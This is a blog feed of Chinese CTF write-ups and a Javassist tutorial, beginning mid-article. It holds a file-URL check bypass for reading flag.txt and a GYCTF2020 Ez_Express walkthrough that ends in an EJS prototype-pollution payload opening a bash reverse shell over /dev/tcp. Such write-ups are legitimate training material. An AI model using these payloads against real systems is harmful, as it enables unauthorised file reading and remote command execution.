class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; fs.<span class="title function_">readFileSync</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&quot;file:///app/flag.txt&quot;</span>)).<span class="title function_">toString</span>()</span><br><span class="line"><span class="string">&#x27;corctf&#123;test_flag&#125;&#x27;</span></span><br><span class="line">&gt; fs.<span class="title function_">readFileSync</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&quot;file:///app/fl%61g.txt&quot;</span>)).<span class="title function_">toString</span>()</span><br><span class="line"><span class="string">&#x27;corctf&#123;test_flag&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>后者可以通过传array格式来绕过，不用传递key，从而绕过对protocol的检测</p><p>payload，注意修改CT为<code>application/json</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line"> <span class="string">&quot;file:&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="string">&quot;/D:\\projects\\fl%61g.txt&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221031112431324.png" alt="image-20221031112431324"></p><p>自己还是太菜了，继续加油学(ง •_•)ง</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li>[exp10it&#x2F;2022 祥云杯 Web Writeup.md at 3f9366ccdc301a4917e2c41a8f08686d8308014d · X1r0z&#x2F;exp10it (github.com)](<a href="https://github.com/X1r0z/exp10it/blob/3f9366ccdc301a4917e2c41a8f08686d8308014d/content/posts/Web/Writeup/2022">https://github.com/X1r0z/exp10it/blob/3f9366ccdc301a4917e2c41a8f08686d8308014d/content/posts/Web/Writeup/2022</a> 祥云杯 Web Writeup.md)</li><li><a href="https://brycec.me/posts/corctf_2022_challenges">corCTF 2022 Challenges (brycec.me)</a></li><li><a href="https://nodejs.org/api/fs.html#fsreadfilesyncpath-options">File system | Node.js v19.0.0 Documentation (nodejs.org)</a></li><li><a href="https://mp.weixin.qq.com/s/98UP4biny-CvePYuCX5bwQ">2022 第三届“祥云杯” writeup by Arr3stY0u (qq.com)</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 2022 </tag>
            
            <tag> 祥云杯初赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020 Ez_Express</title>
      <link href="/2022/10/26/GYCTF2020-Ez-Express/"/>
      <url>/2022/10/26/GYCTF2020-Ez-Express/</url>
      
        <content type="html"><![CDATA[<h1 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h1><h2 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h2><p>文件泄露<code>www.zip</code></p><p>主要逻辑在routes&#x2F;index.js</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221026223143528.png" alt="image-20221026223143528"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;   <span class="comment">// 存在原型链污染</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">safeKeyword</span>(<span class="params">keyword</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.<span class="title function_">match</span>(<span class="regexp">/(admin)/i</span>s)) &#123;  <span class="comment">// 不区分大小写</span></span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="property">outputFunctionName</span>=<span class="literal">undefined</span>;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_">safeKeyword</span>(req.<span class="property">body</span>.<span class="property">userid</span>))&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span>=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.<span class="property">body</span>.<span class="property">userid</span>.<span class="title function_">toUpperCase</span>(),   <span class="comment">//好像存在问题</span></span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.<span class="property">body</span>.<span class="property">pwd</span>,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>==req.<span class="property">body</span>.<span class="property">userid</span>&amp;&amp;req.<span class="property">body</span>.<span class="property">pwd</span>==req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">passwd</span>)&#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isLogin</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/action&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>); <span class="comment">// clone 调用merge函数，进行原型链污染</span></span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/info&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.<span class="property">outputFunctionName</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><h2 id="toUpperCase"><a href="#toUpperCase" class="headerlink" title="toUpperCase"></a>toUpperCase</h2><p>login路由对应的代码，注册的时候，会使用safeKeyword对userid（也就是用户名进行判断）</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221026223429940.png" alt="image-20221026223429940"></p><p>跟进safeKeyword()函数，发现不能是admin</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">safeKeyword</span>(<span class="params">keyword</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.<span class="title function_">match</span>(<span class="regexp">/(admin)/i</span>s)) &#123;  <span class="comment">// 不区分大小写</span></span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是判断之后，会将userid.toUpperCase()和pwd写入session，在之后的action路由里面，需要userid为<code>ADMIN</code></p><p>这样就产生了一个矛盾：<code>safeKeyword不允许userid存在admin(无论大小写)，action路由需要userid.toUpperCase()为ADMIN</code></p><p>解决的办法：</p><blockquote><p>在Character.toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。<br>在Character.toLowerCase()函数中，字符İ会转变为i，字符K会转变为k。</p></blockquote><p>所以我们可以让<code>userid=ADMıN</code>，即可过safeKeyword，也会在经过toUpperCase()函数之后，满足<code>ADMIN</code>的条件</p><h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><p>action路由，判断userid之后，将req.body传入clone</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221026224157320.png" alt="image-20221026224157320"></p><p>跟进clone(),发现调用merge()函数</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221026224233610.png" alt="image-20221026224233610"></p><p>跟进merge()，是一个典型的原型链污染，具体分析看<a href="https://blog.csdn.net/RABCDXB/article/details/124180297?spm=1001.2014.3001.5501"> 原型链污染学习（1）_Sk1y的博客-CSDN博客</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221026224258172.png" alt="image-20221026224258172"></p><p>再来看info路由，返回<code>res.outputFunctionName</code>给模板渲染</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221026224402656.png" alt="image-20221026224402656"></p><p>发现ejs模板引擎，ejs存在原型链污染进行RCE，具体的分析见：<a href="https://www.anquanke.com/post/id/248170#h2-8">从 Lodash 原型链污染到模板 RCE-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221026224445557.png" alt="image-20221026224445557"></p><p><strong>所以思路就是：先通过action路由对outputFunctionName进行原型链污染，而后通过info路由触发执行命令</strong></p><p>action传参，payload如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/7003 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后访问以GET方式访问info，反弹shell</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221026205434035.png" alt="image-20221026205434035"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://www.anquanke.com/post/id/248170#h2-8">从 Lodash 原型链污染到模板 RCE-安全客 - 安全资讯平台 (anquanke.com)</a></li><li><a href="https://blog.csdn.net/rfrder/article/details/115919976">GYCTF2020]Ez_Express_bfengj的博客-CSDN博客</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javassist动态编程</title>
      <link href="/2022/10/24/Javassist%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B/"/>
      <url>/2022/10/24/Javassist%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="javassist介绍"><a href="#javassist介绍" class="headerlink" title="javassist介绍"></a>javassist介绍</h2><p><code>Javassist</code>是一个开源的分析、编辑和创建Java字节码的类库，Java 字节码存储在称为类文件的二进制文件中。每个类文件包含一个 Java 类或接口。是由东京工业大学的数学和计算机科学系的 Shigeru Chiba （千叶 滋）所创建的。其主要的优点，在于简单，而且快速。直接使用java编码的形式，而不需要了解虚拟机指令，就能<code>动态改变类的结构，或者动态生成类。</code></p><p>学习一下javassist主要的几个类</p><h2 id="javassist几个重要的类"><a href="#javassist几个重要的类" class="headerlink" title="javassist几个重要的类"></a>javassist几个重要的类</h2><p>下面关于类的资料基本是网上copy的</p><h3 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h3><p><code>ClassPool</code>：一个基于哈希表（<code>Hashtable</code>）实现的<code>CtClass</code>对象容器，其中键名是类名称，值是表示该类的<code>CtClass</code>对象</p><p>常用方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ClassPool<span class="title function_">getDefault</span><span class="params">()</span>返回默认的类池。比如 <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">ClassPath<span class="title function_">insertClassPath</span><span class="params">(String pathname)</span>在搜索路径的开头插入目录或jar（或zip）文件。</span><br><span class="line">  </span><br><span class="line">ClassPath<span class="title function_">insertClassPath</span><span class="params">(ClassPath cp)</span>ClassPath在搜索路径的开头插入一个对象。</span><br><span class="line">  </span><br><span class="line">java.lang.ClassLoader<span class="title function_">getClassLoader</span><span class="params">()</span>获取类加载器</span><br><span class="line">  </span><br><span class="line">CtClass<span class="title function_">get</span><span class="params">(java.lang.String classname)</span>从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用。</span><br><span class="line">  </span><br><span class="line">ClassPath<span class="title function_">appendClassPath</span><span class="params">(ClassPath cp)</span> 将ClassPath对象附加到搜索路径的末尾。</span><br><span class="line">  </span><br><span class="line">CtClass<span class="title function_">makeClass</span><span class="params">(java.lang.String classname)</span>  创建一个新的<span class="keyword">public</span>类</span><br></pre></td></tr></table></figure><h3 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h3><p>CtClass：表示一个类，一个<code>CtClass</code>(编译时类）对象可以处理一个<code>class</code>文件,这些CtClass对象可以从ClassPool获得。</p><p>一般都是对CtClass类对象进行操作，比如添加方法，添加成员属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;cc2.classdemo2&quot;</span>);</span><br></pre></td></tr></table></figure><p>常用方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span><span class="title function_">setSuperclass</span><span class="params">(CtClass clazz)</span>更改超类，除非此对象表示接口。</span><br><span class="line"></span><br><span class="line">java.lang.Class&lt;?&gt;toClass(java.lang.invoke.MethodHandles.Lookup lookup)</span><br><span class="line">将此类转换为java.lang.Class对象。</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[]toBytecode()将该类转换为类文件。</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span><span class="title function_">writeFile</span><span class="params">()</span>将由此CtClass 对象表示的类文件写入当前目录。</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span><span class="title function_">writeFile</span><span class="params">(java.lang.String directoryName)</span> 将由此CtClass 对象表示的类文件写入本地磁盘。</span><br><span class="line"></span><br><span class="line">CtConstructor<span class="title function_">makeClassInitializer</span><span class="params">()</span>制作一个空的类初始化程序（静态构造函数）。</span><br></pre></td></tr></table></figure><h3 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h3><p>CtMethod：表示类中的方法。超类为CtBehavior，很多有用的方法都在CtBehavior</p><p><strong>也就是关于添加方法的一系列操作</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span><span class="title function_">insertBefore</span> <span class="params">(java.lang.String src)</span></span><br><span class="line">在正文的开头插入字节码。</span><br><span class="line"><span class="keyword">void</span><span class="title function_">insertAfter</span><span class="params">(java.lang.String src)</span></span><br><span class="line">在正文的末尾插入字节码。</span><br><span class="line"><span class="keyword">void</span><span class="title function_">setBody</span> <span class="params">(CtMethod src, ClassMap map)</span></span><br><span class="line">从另一个方法复制方法体。</span><br></pre></td></tr></table></figure><h3 id="CtConstructor"><a href="#CtConstructor" class="headerlink" title="CtConstructor"></a>CtConstructor</h3><p>CtConstructor的实例表示一个构造函数。它可能代表一个静态构造函数。</p><p><strong>也就是创建有参或者无参函数</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span><span class="title function_">setBody</span><span class="params">(java.lang.String src)</span></span><br><span class="line">设置构造函数主体。</span><br><span class="line"><span class="keyword">void</span><span class="title function_">setBody</span><span class="params">(CtConstructor src, ClassMap map)</span></span><br><span class="line">从另一个构造函数复制一个构造函数主体。</span><br><span class="line">CtMethod<span class="title function_">toMethod</span><span class="params">(java.lang.String name, CtClass declaring)</span></span><br><span class="line">复制此构造函数并将其转换为方法。</span><br></pre></td></tr></table></figure><h3 id="ClassClassPath"><a href="#ClassClassPath" class="headerlink" title="ClassClassPath"></a>ClassClassPath</h3><p>定义在 java.lang.Class 中获取类文件的搜索路径。</p><p>构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClassClassPath(java.lang.Class&lt;?&gt; c)</span><br><span class="line">创建一个搜索路径。</span><br></pre></td></tr></table></figure><p>比如下面的代码，是在默认系统搜索路径获取demo对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="comment">// 获取目标类 cc2.demo</span></span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;cc2.demo&quot;</span>);</span><br></pre></td></tr></table></figure><p>但是我们可以通过<code>insertClassPath</code>修改这个搜索路径</p><p>如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(test_javassist3.class.getClass()));</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;cc1.cc1_test&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="功能一：动态生成类"><a href="#功能一：动态生成类" class="headerlink" title="功能一：动态生成类"></a>功能一：动态生成类</h2><p><code>也就是通过javassist上面的几个类以及对应的方法可以构造一个恶意的类，其中的方法，属性，接口等等我们都可以自己定义</code></p><p>动态生成类需要以下几个步骤（重点为前3步或者前4步）</p><ol><li>获取默认类池<code>ClassPool classPool = ClassPool.getDefault();</code></li><li>创建一个自定义类<code>CtClass ctClass = classPool.makeClass();</code></li><li>添加实现接口&#x2F;属性&#x2F;构造方法&#x2F;普通方法</li><li>写入磁盘</li><li>进行验证（也就是调用该类的方法）</li></ol><p>简单的动态生成一个含有calcmethod(弹计算器)方法的类classdemo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javafx.util.converter.LocalDateStringConverter;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test_javassist</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="comment">// 1. 获取默认类池</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 2. 创建一个自定义类classdemo</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;cc2.classdemo&quot;</span>);</span><br><span class="line">        <span class="comment">// 3. 添加一个方法</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void calcmethod()&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>,ctClass);</span><br><span class="line">        <span class="comment">// 将该方法添加给ctClass</span></span><br><span class="line">        ctClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 写入磁盘</span></span><br><span class="line">        <span class="comment">// 转换为字节流</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="comment">// 使用writefile指定绝对路径写入磁盘</span></span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;D:\\projects\\java\\java1\\src\\main\\java&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 验证</span></span><br><span class="line">        <span class="comment">// 调用classdemo的方法</span></span><br><span class="line">        <span class="comment">// 获取javassist的Classloader</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Loader</span>(classPool);</span><br><span class="line">        <span class="comment">// 加载该class文件</span></span><br><span class="line">        Class&lt;?&gt; aClass = loader.loadClass(<span class="string">&quot;cc2.classdemo&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用该方法</span></span><br><span class="line">        aClass.getDeclaredMethod(<span class="string">&quot;calcmethod&quot;</span>).invoke(aClass.newInstance());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p>在指定目录下生成classdemo.class</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221023231659650.png" alt="image-20221023231659650"></p><p>并且加载该类并调用calcmethod方法成功</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221023231453520.png" alt="image-20221023231453520"></p><p>然后更加丰富一点，在这个基础上添加接口，属性等等</p><p>比如下面这个，我们新建了一个classdemo2.class，实现了<code>Serializable接口</code>，新增了id和name属性，新增了无参和有参构造方法，并且通过实例化，反射调用getname和getid方法。</p><figure class="highlight 